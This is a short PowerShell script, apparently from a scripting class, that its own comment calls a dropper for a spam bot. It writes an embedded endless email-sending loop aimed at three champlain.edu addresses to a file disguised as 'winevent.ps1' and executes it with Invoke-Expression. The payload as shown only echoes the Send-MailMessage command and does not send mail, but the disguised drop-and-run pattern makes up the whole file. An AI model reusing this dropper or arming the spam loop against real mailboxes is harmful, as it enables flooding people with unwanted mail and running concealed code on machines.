# Dropper for our spam bot. This will save to a dir and execute


$writeSpammer = @'
# Send an email using PowerShell
$toSend = @("dunston@champlain.edu","ston@champlain.edu","duns@champlain.edu")

$msg = "Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
$from = "dylan.nvarro@mymail.champlain.edu"
$mailServer = "X.X.X.X"

while ($true) {
    foreach ($email in $toSend) {
        # Send the email
        Write-Host "Send-MailMessage -from $from -To $email -Subject 'Tisk Tisk' -Body $msg -SmtpServer $mailServer"
        # Pause for a second
        Start-Sleep 1
    }
}
'@
# Directory to put the spammer
$directory = "E:\Repositories\SYS320-Automation-Scripting\Week11\class\"

# Create a random number
$random = Get-Random -Minimum 1000 -Maximum 1999

# Create the file and location to save
$file = $directory + $random + "winevent.ps1"

# Write to a file
$writeSpammer | Out-File -FilePath $file

# Execute the script
Invoke-Expression $file